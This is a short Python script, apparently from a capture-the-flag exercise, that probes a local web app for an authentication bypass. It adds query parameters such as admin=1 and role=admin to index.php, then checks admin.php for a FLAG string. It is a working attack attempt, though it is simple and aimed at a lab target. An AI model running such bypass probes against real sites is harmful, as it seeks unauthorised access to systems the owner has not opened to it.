import requests, re, sys

url = "http://127.0.0.1:33107"

# Simple auth bypass test based on context
# The hint suggested variables in query string might affect authentication
test_cases = [
    ("admin", "1"),
    ("is_admin", "true"),
    ("role", "admin")
]

for var, val in test_cases:
    print(f"Testing {var}={val}")
    
    # Try injection
    session = requests.Session()
    resp = session.get(f"{url}/index.php?category=secret&{var}={val}", timeout=10)
    
    # Check admin access
    admin_resp = session.get(f"{url}/admin.php", timeout=10)
    print(f"Status: {admin_resp.status_code}, Length: {len(admin_resp.text)}")
    
    flag = re.search(r'FLAG\{[^}]+\}', admin_resp.text, re.I)
    if flag:
        print(f"[!] FLAG: {flag.group()}")
        sys.exit(0)
    
    if admin_resp.status_code == 200:
        print(f"Preview: {admin_resp.text[:100]}")
        break

print("Test complete")
